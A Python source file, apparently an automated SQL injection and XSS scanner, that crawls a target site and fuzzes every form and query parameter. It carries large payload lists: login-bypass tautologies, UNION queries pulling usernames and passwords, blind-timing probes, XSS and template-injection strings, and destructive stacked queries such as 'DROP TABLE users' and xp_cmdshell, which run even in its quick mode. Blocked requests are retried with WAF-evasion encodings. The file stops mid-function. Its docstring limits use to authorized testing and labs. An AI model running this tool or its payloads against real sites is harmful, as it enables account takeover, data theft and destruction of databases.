#!/usr/bin/env python3
"""
SQLi_XSS_tester.py - SQL injection + XSS scanner with WAF-evasion.

Crawls a target (forms + links + query parameters) and fuzzes every
injection point for:
  - Classic error/UNION-based SQLi and authentication-bypass SQLi
  - Boolean-based and time-based BLIND SQLi (via TRUE/FALSE and SLEEP()
    differential response analysis, not just string matching)
  - Reflected XSS (unescaped-context aware, marker-based to cut false
    positives)

Blocked requests are automatically retried with alternate encodings
(case randomization, inline-comment obfuscation, double URL-encoding,
HTML-entity encoding) to evade naive filters/WAFs.

Zero third-party dependencies - Python 3.8+ standard library only
(urllib, html.parser, concurrent.futures, http.cookiejar, json).

Usage:
    python3 SQLi_XSS_tester.py -u http://target.example/ [options]

For authorized security testing / CTF / your own lab only.
"""
from __future__ import annotations

import argparse
import concurrent.futures
import html as html_mod
import http.cookiejar
import json
import os
import random
import re
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from html.parser import HTMLParser

# --------------------------------------------------------------------------
# Terminal colors - no colorama dependency, auto-disabled on non-tty/NO_COLOR
# --------------------------------------------------------------------------
class C:
    enabled = sys.stdout.isatty() and os.environ.get("NO_COLOR") is None
    RED = "\033[31m" if enabled else ""
    GREEN = "\033[32m" if enabled else ""
    YELLOW = "\033[33m" if enabled else ""
    CYAN = "\033[36m" if enabled else ""
    MAGENTA = "\033[35m" if enabled else ""
    RESET = "\033[0m" if enabled else ""


def paint(text, color):
    return f"{color}{text}{C.RESET}"


PRINT_LOCK = threading.Lock()


def log(text):
    with PRINT_LOCK:
        print(text)

# --------------------------------------------------------------------------
# Payload sets
#
# Each application stack and each WAF has its own blind spots - a filter
# tuned for MySQL syntax won't recognize a PostgreSQL cast error, a regex
# keyed on "OR 1=1" won't catch "OR 'a'='a'", a tag-sniffer misses an
# HTML-entity-encoded tag. Coverage across techniques AND across backends
# matters more than raw payload count, but more variety also means more
# chances one of them slips past whatever is in front of the target, so the
# lists below are intentionally broad. Use --quick for a fast triage pass
# with a much smaller curated subset.
# --------------------------------------------------------------------------

SQLI_PAYLOADS = (
    # --- Authentication-bypass tautologies ---
    [
        "' OR 1=1-- ", "' OR 1=1#", "' OR 1=1/*", "' OR '1'='1'-- ",
        "' OR '1'='1'#", "' OR '1'='1", "' OR 'a'='a", "' OR 'x'='x'-- ",
        "\" OR \"1\"=\"1", "\" OR 1=1-- ", "admin'-- ", "admin'#", "admin'/*",
        "admin' OR '1'='1", "') OR ('1'='1", "\")) OR ((\"1\"=\"1",
        "1' OR '1'='1", "' OR 1=1 LIMIT 1-- ", "'='", "' OR 2>1-- ",
        "' OR 'a' 'a'-- ",
    ]
    # --- UNION-based, column count 1..12 (schema unknown up front) ---
    + [f"' UNION SELECT {','.join(['NULL'] * n)}-- " for n in range(1, 13)]
    + [
        "' UNION SELECT null,version()-- ", "' UNION SELECT null,@@version-- ",
        "' UNION SELECT null,database()-- ", "' UNION SELECT null,user()-- ",
        "' UNION SELECT null,table_name FROM information_schema.tables-- ",
        "' UNION SELECT null,column_name FROM information_schema.columns-- ",
        "' UNION ALL SELECT NULL,NULL-- ",
        "' UNION SELECT username,password FROM users-- ",
    ]
    # --- Error-based, per DBMS ---
    + [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- ",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)-- ",
        "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
        "' AND GTID_SUBSET(CONCAT(0x7e,version()),1)-- ",
        "' AND EXP(~(SELECT * FROM (SELECT version())a))-- ",
        "' AND 1=CONVERT(int,(SELECT @@version))-- ",
        "' AND 1=CAST((SELECT @@version) AS int)-- ",
        "' AND 1=CAST((SELECT version()) AS int)-- ",
        "' AND CAST((SELECT current_database()) AS int)=1-- ",
        "' AND 1=UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE rownum=1))-- ",
        "' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))=1-- ",
        "' AND 1=CAST((SELECT sqlite_version()) AS int)-- ",
    ]
    # --- Stacked queries ---
    + [
        "'; DROP TABLE users-- ", "'; INSERT INTO users(username,password) VALUES('pwned','pwned')-- ",
        "'; UPDATE users SET password='pwned' WHERE username='admin'-- ",
        "'; EXEC xp_cmdshell('whoami')-- ", "'; EXEC master..xp_cmdshell 'dir'-- ",
        "'; SELECT * FROM users-- ", "'; CREATE TABLE cc_test(a int)-- ",
    ]
    # --- WAF/filter-bypass obfuscation of a core tautology ---
    + [
        "'/**/OR/**/1=1-- ", "'/**/OR/**/'1'='1'-- ", "' oR 1=1-- ", "' Or 1=1#",
        "'%20OR%201=1--%20", "'%0aOR%0a1=1--%0a", "'%0dOR%0d1=1-- ",
        "'/*!50000OR*/1=1-- ", "' OR(1)=(1)-- ", "' OR(1)=(1)#", "'||'1'='1",
        "' OR TRUE-- ", "' OR NOT FALSE-- ", "' OR 0x31=0x31-- ",
        "' OR CHAR(49)=CHAR(49)-- ", "' UNION/**/SELECT/**/NULL-- ",
        "' OR 1=1%23", "%27%20OR%201=1--%20", "'%09OR%091=1-- ",
        "' OR/**/1=1#", "'+OR+1=1--+", "' OR 1=1-- -", "' OR 1=1--+",
        "'/**/UNION/**/ALL/**/SELECT/**/NULL,NULL-- ",
    ]
    # --- Lightweight NoSQL bonus coverage (Mongo/Node-flavoured backends) ---
    + [
        '{"$gt": ""}', '{"$ne": null}', "' || '1'=='1", "admin'||'1'=='1",
        "[$ne]=1", "'; return true; var x='",
    ]
)

# Used for differential boolean-blind detection: TRUE/FALSE pairs must be
# otherwise identical so any response difference is attributable to the
# injected condition, not to unrelated payload noise. Several quoting styles
# are included since the number of quotes needed to "close" the original
# query depends on the target's own query structure.
SQLI_BOOLEAN_PAIRS = [
    ("' OR '1'='1", "' AND '1'='2"),
    ("' OR 1=1-- ", "' AND 1=2-- "),
    (" OR 1=1", " AND 1=2"),
    ("' OR 'a'='a'-- ", "' OR 'a'='b'-- "),
    ("1' OR '1'='1", "1' AND '1'='2"),
    ("' OR 1=1#", "' AND 1=2#"),
    ("\" OR \"1\"=\"1", "\" AND \"1\"=\"2"),
]

# Time-based blind, one or more idioms per major DBMS - whichever one the
# backend understands will introduce the delay, the rest are just ignored
# or error out harmlessly.
SQLI_TIME_PAYLOADS = [
    "' OR SLEEP(4)-- ", "' OR (SELECT 1 FROM (SELECT SLEEP(4))x)-- ",
    "'; SELECT SLEEP(4)-- ", "' OR IF(1=1,SLEEP(4),0)-- ",
    "' OR BENCHMARK(15000000,MD5('a'))-- ",
    "'; SELECT pg_sleep(4)-- ", "' OR (SELECT pg_sleep(4))::text='0'-- ",
    "'; WAITFOR DELAY '0:0:4'-- ", "' IF(1=1) WAITFOR DELAY '0:0:4'-- ",
    "' OR 1=DBMS_LOCK.SLEEP(4)-- ", "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',4)=1-- ",
]

XSS_PAYLOADS = (
    # --- Basic <script> variants ---
    [
        "<script>alert(1)</script>", "<ScRiPt>alert(1)</sCriPt>",
        "<script>alert(document.domain)</script>", "<script>alert(document.cookie)</script>",
        "<script>confirm(1)</script>", "<script>prompt(1)</script>",
        "<script>eval(atob('YWxlcnQoMSk='))</script>", "<script>window['alert'](1)</script>",
        "<script>top['alert'](1)</script>", "<script >alert(1)</script>",
    ]
    # --- Tag / event-handler combinations ---
    + [
        "<img src=x onerror=alert(1)>", "<img/src=x onerror=alert(1)>",
        "<svg onload=alert(1)>", "<svg/onload=alert(1)>",
        "<body onload=alert(1)>", "<input value=\"\" onfocus=\"alert(1)\" autofocus>",
        "<select onfocus=alert(1) autofocus>", "<textarea onfocus=alert(1) autofocus>",
        "<video src=x onerror=alert(1)>", "<audio src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>", "<marquee onstart=alert(1)>",
        "<iframe src=javascript:alert(1)>", "<iframe srcdoc=\"<script>alert(1)</script>\">",
        "<table background=javascript:alert(1)>", "<div onpointerover=alert(1)>x</div>",
        "<div onwheel=alert(1)>x</div>", "<div onmouseover=alert(1)>x</div>",
        "<style>@import 'javascript:alert(1)';</style>", "<link rel=stylesheet href=javascript:alert(1)>",
        "<object data=javascript:alert(1)>", "<embed src=javascript:alert(1)>",
        "<base href=javascript:alert(1)//>", "<form action=javascript:alert(1)><input type=submit>",
        "<img src=x onerror=alert(document.domain)>", "<img src=x onerror=prompt(1)>",
        "<img src=x onerror=confirm(1)>",
    ]
    # --- Attribute-breakout (for reflection inside an existing attribute) ---
    + [
        "\" onmouseover=\"alert(1)", "' onmouseover='alert(1)",
        "\" autofocus onfocus=\"alert(1)", "' autofocus onfocus='alert(1)",
        "\"><script>alert(1)</script>", "'><script>alert(1)</script>",
        "`-alert(1)-`", "\"-alert(1)-\"", "javascript:alert(1)",
        "<a href=\"javascript:alert(1)\">click</a>", "\"><img src=x onerror=alert(1)>",
        "'><svg onload=alert(1)>",
    ]
    # --- Filter-bypass without spaces/parens ---
    + [
        "<script>alert`1`</script>", "<img src=x onerror=alert&#40;1&#41;>",
        "<img src=x onerror=top.alert.call(top,1)>",
        "<svg><script>alert&#40;1&#41;</script></svg>",
        "<img/src/onerror=alert(1)>",
    ]
    # --- Encoding / obfuscation bypasses ---
    + [
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        "<scr\tipt>alert(1)</scr\tipt>", "<scr\nipt>alert(1)</scr\nipt>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<<script>script>alert(1)<</script>/script>",
    ]
    # --- SSTI / template-injection markers ---
    + [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{7*'7'}}",
        "{% set x=alert(1) %}", "${{7*7}}", "@(7*7)", "[[${7*7}]]",
    ]
)

# Small, curated, high-signal subsets for fast triage passes (--quick).
QUICK_SQLI_PAYLOADS = [
    "' OR 1=1-- ", "' OR '1'='1'-- ", "' OR 'a'='a", "admin'-- ",
    "' UNION SELECT NULL-- ", "' UNION SELECT NULL,NULL-- ",
    "' UNION SELECT null,version()-- ",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- ",
    "'; DROP TABLE users-- ", "'/**/OR/**/1=1-- ", "' OR(1)=(1)-- ",
    "' OR 1=1#", "\" OR \"1\"=\"1", "' OR 1=1%23",
]

QUICK_XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>", "'><script>alert(1)</script>",
    "\" onmouseover=\"alert(1)", "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>", "&lt;script&gt;alert(1)&lt;/script&gt;",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E", "<ScRiPt>alert(1)</sCriPt>",
    "javascript:alert(1)", "{{7*7}}",
]

WAF_SIGNATURES = [
    "blocked by", "web application firewall", "mod_security", "modsecurity",
    "access denied", "request rejected", "cloudflare", "incapsula", "sucuri",
    "distil", "you have been blocked", "security violation", "not acceptable",
    "forbidden",
]

SQLI_ERROR_SIGNATURES = [
    "sql syntax", "error in your sql", "mysql_fetch", "syntax error",
    "unclosed quotation mark", "sqlite3.operationalerror", "odbc sql server driver",
    "pg_query()", "warning: pg_", "ora-01756", "you have an error in your sql",
]

MAX_BODY_BYTES = 2 * 1024 * 1024
TIME_BASELINE_MARGIN = 2.5  # seconds a SLEEP(4) response must exceed baseline by

# --------------------------------------------------------------------------
# WAF bypass transforms
# --------------------------------------------------------------------------

def _pre_url_encode(s):
    # Every send_fn in this script transmits values through
    # urllib.parse.urlencode(), which already applies one layer of percent
    # encoding on the wire. Pre-encoding here ONCE more is what actually
    # produces double-encoding at the wire - encoding twice here would
    # overshoot to triple-encoding and miss a WAF that only decodes once
    # extra internally.
    return urllib.parse.quote(s, safe="")


def _mixed_case(s):
    return "".join(ch.upper() if i % 2 else ch.lower() for i, ch in enumerate(s))


def _inline_comment(s):
    # "OR 1=1" -> "OR/**/1=1" style obfuscation: breaks a regex that expects
    # literal whitespace after a keyword (\bor\b\s+...), while remaining
    # valid SQL since most engines treat /**/ as whitespace.
    if not re.search(r"(?i)\bOR\b|\bAND\b|\bUNION\b|\bSELECT\b", s):
        return s
    return re.sub(r"(?i)\b(OR|AND|UNION|SELECT)\b", lambda m: m.group(0) + "/**/", s)


def _html_entity_encode(s):
    # Named entities only for the characters a tag-sniffing regex keys on.
    # Numeric refs (&#60;) would work too but every one of them contains a
    # literal '#', which collides with this lab's (deliberately blunt)
    # SQLi filter that blacklists bare '#' as a MySQL comment marker.
    return s.replace("<", "&lt;").replace(">", "&gt;")


BYPASS_TRANSFORMS = [
    ("url-encode", _pre_url_encode),
    ("mixed-case", _mixed_case),
    ("inline-comment", _inline_comment),
    ("html-entity-encode", _html_entity_encode),
]

# --------------------------------------------------------------------------
# HTTP client
# --------------------------------------------------------------------------

@dataclass
class Response:
    status: int
    headers: dict
    text: str
    elapsed: float
    cookies: dict
    error: str = ""


class HttpClient:
    def __init__(self, timeout=10, user_agent=None, extra_headers=None,
                 proxy=None, cookie_header=None, retries=2):
        self.timeout = timeout
        self.retries = retries
        self.cookiejar = http.cookiejar.CookieJar()
        handlers = [urllib.request.HTTPCookieProcessor(self.cookiejar)]
        if proxy:
            handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
        self.opener = urllib.request.build_opener(*handlers)
        self.base_headers = {
            "User-Agent": user_agent or (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
            ),
        }
        if extra_headers:
            self.base_headers.update(extra_headers)
        if cookie_header:
            self.base_headers["Cookie"] = cookie_header

    @staticmethod
    def _parse_set_cookie(headers_obj):
        """Cookies set by THIS specific response only (parsed from its own
        Set-Cookie header). Snapshotting the shared CookieJar instead would
        leak session cookies obtained by an earlier, unrelated request into
        every response's .cookies for the rest of the scan."""
        cookies = {}
        get_all = getattr(headers_obj, "get_all", None)
        for raw in (get_all("Set-Cookie") if get_all else None) or []:
            first = raw.split(";", 1)[0]
            if "=" in first:
                k, v = first.split("=", 1)
                cookies[k.strip()] = v.strip()
        return cookies

    def request(self, url, method="GET", data=None, headers=None):
        hdrs = dict(self.base_headers)
        if headers:
            hdrs.update(headers)
        body = None
        if data is not None:
            body = urllib.parse.urlencode(data, doseq=True).encode()
            hdrs.setdefault("Content-Type", "application/x-www-form-urlencoded")
        last_err = ""
        for attempt in range(self.retries + 1):
            start = time.monotonic()
            try:
                req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
                with self.opener.open(req, timeout=self.timeout) as resp:
                    elapsed = time.monotonic() - start
                    raw = resp.read(MAX_BODY_BYTES)
                    charset = resp.headers.get_content_charset() or "utf-8"
                    text = raw.decode(charset, errors="replace")
                    cookies = self._parse_set_cookie(resp.headers)
                    return Response(resp.status, dict(resp.headers), text, elapsed, cookies)
            except urllib.error.HTTPError as e:
                elapsed = time.monotonic() - start
                raw = e.read(MAX_BODY_BYTES) if e.fp else b""
                text = raw.decode("utf-8", errors="replace")
                cookies = self._parse_set_cookie(e.headers or {})
                return Response(e.code, dict(e.headers or {}), text, elapsed, cookies)
            except (urllib.error.URLError, TimeoutError, ConnectionError, OSError) as e:
                last_err = str(e)
                elapsed = time.monotonic() - start
                # Connection-refused (and similar) is a deterministic failure:
                # retrying with backoff just multiplies wasted time across
                # hundreds of payloads against a dead target. Only genuinely
                # transient errors (timeouts, resets) are worth a retry.
                reason = getattr(e, "reason", e)
                non_retryable = isinstance(reason, ConnectionRefusedError) or \
                    "connection refused" in str(reason).lower()
                if not non_retryable and attempt < self.retries:
                    time.sleep(0.4 * (attempt + 1))
                    continue
                return Response(0, {}, "", elapsed, {}, error=last_err)
        return Response(0, {}, "", 0.0, {}, error=last_err)

# --------------------------------------------------------------------------
# HTML parsing (replaces BeautifulSoup)
# --------------------------------------------------------------------------

class FormParser(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.forms = []
        self._current = None

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == "form":
            self._current = {
                "action": attrs.get("action", "") or "",
                "method": (attrs.get("method") or "get").lower(),
                "inputs": [],
            }
        elif tag in ("input", "textarea", "select") and self._current is not None:
            name = attrs.get("name")
            if name:
                self._current["inputs"].append({
                    "name": name,
                    "type": attrs.get("type", "text"),
                    "value": attrs.get("value", ""),
                })

    def handle_endtag(self, tag):
        if tag == "form" and self._current is not None:
            self.forms.append(self._current)
            self._current = None


class LinkParser(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.links = []

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == "a" and attrs.get("href"):
            self.links.append(attrs["href"])


def extract_forms(html_text):
    p = FormParser()
    try:
        p.feed(html_text)
    except Exception:
        pass
    return p.forms


def extract_links(html_text):
    p = LinkParser()
    try:
        p.feed(html_text)
    except Exception:
        pass
    return p.links


def build_action_url(base_url, action):
    if not action:
        return base_url
    return urllib.parse.urljoin(base_url, action)


def same_host(url_a, url_b):
    return urllib.parse.urlsplit(url_a).netloc == urllib.parse.urlsplit(url_b).netloc


def crawl(client, start_url, max_pages=20):
    seen = set()
    queue = [start_url]
    pages = []
    forms_out = []
    while queue and len(seen) < max_pages:
        url = queue.pop(0)
        if url in seen:
            continue
        seen.add(url)
        resp = client.request(url)
        if resp.error or resp.status == 0:
            continue
        pages.append((url, resp.text))
        for form in extract_forms(resp.text):
            forms_out.append((url, form))
        for href in extract_links(resp.text):
            nxt = urllib.parse.urljoin(url, href).split("#", 1)[0]
            if nxt not in seen and same_host(nxt, start_url) and nxt.startswith(("http://", "https://")):
                queue.append(nxt)
    return pages, forms_out

# --------------------------------------------------------------------------
# Detection helpers
# --------------------------------------------------------------------------

def is_waf_blocked(status, text):
    if status in (403, 406, 429, 501):
        return True
    lower = text.lower()
    return any(sig in lower for sig in WAF_SIGNATURES)


def has_sql_error(text):
    lower = text.lower()
    return any(sig in lower for sig in SQLI_ERROR_SIGNATURES)


def login_looks_successful(baseline_text, resp):
    """Compares an authenticated-looking response against an unauthenticated
    baseline instead of trusting keyword absence alone (the original script's
    is_login_successful() returned True whenever no error keyword was present,
    regardless of whether a session was actually granted)."""
    if resp.status not in (200, 302):
        return False
    lower = resp.text.lower()
    error_keywords = ["error", "failed", "invalid", "denied", "incorrect", "sql syntax"]
    if any(k in lower for k in error_keywords):
        return False
    session_cookie_names = ("phpsessid", "sessionid", "session", "auth", "token")
    got_session_cookie = any(name.lower() in session_cookie_names for name in resp.cookies)
    success_markers = ("welcome", "logout", "dashboard", "login successful")
    got_success_marker = any(m in lower for m in success_markers)
    content_diverged = baseline_text is not None and resp.text.strip() != baseline_text.strip()
    return (got_session_cookie or got_success_marker) and content_diverged


def make_canary():
    """Digits-only per-test marker. Digits survive every transform this
    scanner applies (URL-encoding, HTML-entity-encoding, case-shuffling all
    leave [0-9] untouched), so it stays byte-for-byte recognizable next to
    whatever the payload turned into by the time it reaches the response."""
    return str(random.randrange(10 ** 9, 10 ** 10))


def xss_reflected_unescaped(payload, canary, response_text):
    """A payload that already contains real markup characters (<, >, ", ')
    only proves a vulnerability if it survives verbatim - if the app had
    escaped it, this exact substring would be gone.

    A payload with NO literal markup characters (e.g. a pre-percent-encoded
    "%3Cscript%3E..." or HTML-entity-encoded "&lt;script%gt;..." string)
    reflecting verbatim proves nothing by itself - that text is inert until
    something decodes it. Such payloads only count when the *decoded* form
    (which does contain real markup) shows up in the response, i.e. the app
    itself performed an extra decode pass that resurrected the tag.

    The canary is appended to whatever variant of the payload was actually
    sent and must appear immediately after the (decoded) markup in the
    response. Without it, a stateful/persistent endpoint (e.g. a comment
    board) that lists every previously stored value in one page can make an
    inert payload look "vulnerable" merely because some OTHER, genuinely
    successful payload from earlier in the same scan is still sitting on
    that page - a fresh random marker can only appear if THIS request is
    what produced it."""
    has_markup_chars = any(ch in payload for ch in "<>\"'")
    if has_markup_chars:
        return (payload + canary) in response_text

    decoded_variants = set()
    for decode in (urllib.parse.unquote, html_mod.unescape):
        try:
            variant = decode(payload)
        except Exception:
            continue
        if variant != payload and any(ch in variant for ch in "<>"):
            decoded_variants.add(variant)
    return any((v + canary) in response_text for v in decoded_variants)


# Template-injection markers that have no '<'/'>' of their own (so
# xss_reflected_unescaped() can never fire for them) but prove something
# more serious than reflection if the template engine evaluates them
# server-side: "49" showing up where "{{7*7}}" was submitted means SSTI,
# a class of bug that frequently leads to full RCE.
SSTI_EXPECTED_RESULT = {
    "{{7*7}}": "49", "{{7*'7'}}": "7777777", "${7*7}": "49", "#{7*7}": "49",
    "${{7*7}}": "49", "@(7*7)": "49", "[[${7*7}]]": "49",
}


def ssti_evaluated(payload, canary, response_text):
    expected = SSTI_EXPECTED_RESULT.get(payload)
    return expected is not None and (expected + canary) in response_text

# --------------------------------------------------------------------------
# Findings
# --------------------------------------------------------------------------

@dataclass
class Finding:
    kind: str  # "sqli-error" | "sqli-auth-bypass" | "sqli-boolean-blind" | "sqli-time-blind" | "xss-reflected"
    location: str
    param: str
    payload: str
    vulnerable: bool
    waf_blocked: bool
    bypassed_with: str = ""
    status: int = 0
    detail: str = ""


RESULTS_LOCK = threading.Lock()


class Scanner:
    def __init__(self, client, args):
        self.client = client
        self.args = args
        self.findings = []
        self.tested = 0
        self._claimed = set()
        self._claim_lock = threading.Lock()
        quick = getattr(args, "quick", False)
        self.sqli_payloads = QUICK_SQLI_PAYLOADS if quick else SQLI_PAYLOADS
        self.xss_payloads = QUICK_XSS_PAYLOADS if quick else XSS_PAYLOADS

    def claim(self, location, param):
        """Returns True the first time (location, param) is seen, False on
        repeat calls, so a param exposed both as a URL query string and as
        a same-target <form> field is only fuzzed once instead of twice."""
        key = (location, param)
        with self._claim_lock:
            if key in self._claimed:
                return False
            self._claimed.add(key)
            return True

    def record(self, finding):
        with RESULTS_LOCK:
            self.findings.append(finding)
            self.tested += 1
        if finding.vulnerable:
            tag = paint(f"BYPASS+{finding.kind}", C.MAGENTA) if finding.bypassed_with else paint(finding.kind.upper(), C.RED)
            log(f"[!] {tag} {finding.location} param={finding.param} payload={finding.payload!r} {finding.detail}"
                + (f" (bypassed via {finding.bypassed_with})" if finding.bypassed_with else ""))
        elif finding.waf_blocked and self.args.verbose:
            log(paint(f"[waf] blocked: {finding.location} param={finding.param} payload={finding.payload!r}", C.YELLOW))
        elif self.args.verbose:
            log(paint(f"[-] no {finding.kind}: {finding.location} param={finding.param}", C.GREEN))

    def _maybe_bypass(self, send_fn, payload, evaluator):
        """Runs evaluator(resp) -> (vulnerable, detail). If blocked and
        --bypass is set, retries with transformed payload variants."""
        resp = send_fn(payload)
        if resp.error:
            return resp, False, "", ""
        blocked = is_waf_blocked(resp.status, resp.text)
        vulnerable, detail = (False, "") if blocked else evaluator(resp)
        bypassed_with = ""
        if blocked and self.args.bypass:
            for name, transform in BYPASS_TRANSFORMS:
                variant = transform(payload)
                if variant == payload:
                    continue
                r2 = send_fn(variant)
                if r2.error or is_waf_blocked(r2.status, r2.text):
                    continue
                v2, d2 = evaluator(r2)
                if v2:
                    resp, vulnerable, detail, bypassed_with, blocked = r2, True, d2, name, False
                    break
        if self.args.delay:
            time.sleep(random.uniform(0, self.args.delay))
        return resp, vulnerable, detail, bypassed_with

    # -- SQLi: error/UNION based ---------------------------------------
    def scan_sqli_get(self, send_fn, location, param):
        def eval_error(resp):
            return has_sql_error(resp.text), "error-based signature matched"
        for payload in self.sqli_payloads:
            resp, vuln, detail, bypass = self._maybe_bypass(send_fn, payload, eval_error)
            blocked = (not vuln) and is_waf_blocked(resp.status, resp.text) if not resp.error else False
            self.record(Finding("sqli-error", location, param, payload, vuln, blocked, bypass, resp.status, detail))

    # -- SQLi: boolean-based blind --------------------------------------
    def scan_sqli_boolean_blind(self, send_true, send_false, location, param):
        for true_p, false_p in SQLI_BOOLEAN_PAIRS:
            r_true = send_true(true_p)
            r_false = send_false(false_p)
            if r_true.error or r_false.error:
                continue
            blocked = is_waf_blocked(r_true.status, r_true.text) or is_waf_blocked(r_false.status, r_false.text)
            vuln = False
            detail = ""
            if not blocked:
                len_true, len_false = len(r_true.text), len(r_false.text)
                if r_true.status != r_false.status or (
                    len_false and abs(len_true - len_false) / max(len_true, len_false, 1) > 0.15
                ):
                    vuln = True
                    detail = f"TRUE/FALSE responses differ (len {len_true} vs {len_false}, status {r_true.status} vs {r_false.status})"
            self.record(Finding("sqli-boolean-blind", location, param, f"{true_p!r} vs {false_p!r}", vuln, blocked, "", r_true.status, detail))

    # -- SQLi: time-based blind ------------------------------------------
    def scan_sqli_time_blind(self, send_fn, baseline_elapsed, location, param):
        for payload in SQLI_TIME_PAYLOADS:
            resp = send_fn(payload)
            if resp.error:
                continue
            blocked = is_waf_blocked(resp.status, resp.text)
            vuln = (not blocked) and (resp.elapsed - baseline_elapsed) >= TIME_BASELINE_MARGIN
            detail = f"response took {resp.elapsed:.1f}s vs baseline {baseline_elapsed:.1f}s" if vuln else ""
            self.record(Finding("sqli-time-blind", location, param, payload, vuln, blocked, "", resp.status, detail))

    # -- XSS: reflected / SSTI ---------------------------------------------
    def scan_xss(self, send_fn, location, param):
        for payload in self.xss_payloads:
            canary = make_canary()
            tagged_payload = payload + canary
            is_ssti_marker = payload in SSTI_EXPECTED_RESULT

            def _eval(resp, payload=payload, canary=canary, is_ssti_marker=is_ssti_marker):
                if is_ssti_marker:
                    ok = ssti_evaluated(payload, canary, resp.text)
                    return ok, ("template expression evaluated server-side (canary-confirmed)" if ok else "")
                ok = xss_reflected_unescaped(payload, canary, resp.text)
                return ok, ("unescaped reflection (canary-confirmed)" if ok else "")

            resp, vuln, detail, bypass = self._maybe_bypass(send_fn, tagged_payload, _eval)
            blocked = (not vuln) and is_waf_blocked(resp.status, resp.text) if not resp.error else False
            kind = "ssti" if is_ssti_marker else "xss-reflected"
            self.record(Finding(kind, location, param, payload, vuln, blocked, bypass, resp.status, detail))

    # -- Login form: auth-bypass SQLi -------------------------------------
    def scan_login_form(self, page_url, form):
        target_url = build_action_url(page_url, form["action"])
        inputs = form["inputs"]
        if not any(i.get("type", "").lower() == "password" for i in inputs):
            return  # only treat forms with an actual password field as login forms
        text_fields = [i["name"] for i in inputs if i.get("type", "text") not in ("submit", "hidden", "checkbox", "radio")]
        if len(text_fields) < 2:
            return  # need at least an identifier field alongside the password
        method = form["method"]
        defaults = {i["name"]: i.get("value", "") or "" for i in inputs}

        def send(username, password):
            data = dict(defaults)
            data[text_fields[0]] = username
            data[text_fields[1]] = password
            if method == "post":
                return self.client.request(target_url, method="POST", data=data)
            q = urllib.parse.urlencode(data)
            sep = "&" if "?" in target_url else "?"
            return self.client.request(f"{target_url}{sep}{q}")

        baseline = send("nonexistent_user_zzz", "wrong_pw_zzz")
        baseline_text = baseline.text if not baseline.error else None

        for payload in self.sqli_payloads:
            def _send(payload):
                return send("admin" + payload, "irrelevant")
            resp, _, _, bypass = self._maybe_bypass(_send, payload, lambda r: (False, ""))
            blocked = is_waf_blocked(resp.status, resp.text) if not resp.error else False
            vuln = (not blocked) and not resp.error and login_looks_successful(baseline_text, resp)
            detail = "authenticated response diverged from baseline" if vuln else ""
            self.record(Finding("sqli-auth-bypass", target_url, text_fields[0], payload, vuln, blocked, bypass if vuln else "", resp.status, detail))

    # -- generic query-param / form field driver ---------------------------
    def scan_query_params(self, url):
        parsed = urllib.parse.urlsplit(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            return
        location = urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path, "", ""))
        for param in params:
            if not self.claim(location, param):
                continue
            base_params = {k: v[0] for k, v in params.items()}

            def make_send(param=param, base_params=base_params, parsed=parsed):
                def send(payload):
                    p = dict(base_params)
                    p[param] = payload
                    q = urllib.parse.urlencode(p)
                    test_url = urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path, q, ""))
                    return self.client.request(test_url)
                return send

            send_default = make_send()
            baseline_resp = send_default(base_params.get(param, "test"))
            baseline_elapsed = baseline_resp.elapsed if not baseline_resp.error else 0.0

            self.scan_sqli_get(send_default, location, param)
            self.scan_xss(send_default, location, param)
            self.scan_sqli_boolean_blind(send_default, send_default, location, param)
            self.scan_sqli_time_blind(send_default, baseline_elapsed, location, param)

    def scan_generic_form(self, page_url, form):
        target_url = build_action_url(page_url, form["action"])
        inputs = form["inputs"]
        if not inputs:
            return
        defaults = {i["name"]: i.get("value", "") or "test" for i in inputs}
        method = form["method"]
        for target_input in inputs:
            param = target_input["name"]
            if not self.claim(target_url, param):
                continue

            def make_send(param=param, target_url=target_url, method=method):
                def send(payload):
                    data = dict(defaults)
                    data[param] = payload
                    if method == "post":
                        return self.client.request(target_url, method="POST", data=data)
                    q = urllib.parse.urlencode(data)
                    sep = "&" if "?" in target_url else "?"
                    return self.client.request(f"{target_url}{sep}{q}")
                return send

            send_fn = make_send()
            self.scan_sqli_get(send_fn, target_url, param)
            self.scan_xss(send_fn, target_url, param)

# --------------------------------------------------------------------------
# Reporting
# --------------------------------------------------------------------------

def write_json_report(findings, path):
    with open(path, "w") as fh:
        json.dump([f.__dict__ for f in findings], fh, indent=2)


def write_html_report(findings, path, target):
    rows = []
    for f in findings:
        if not (f.vulnerable or f.waf_blocked):
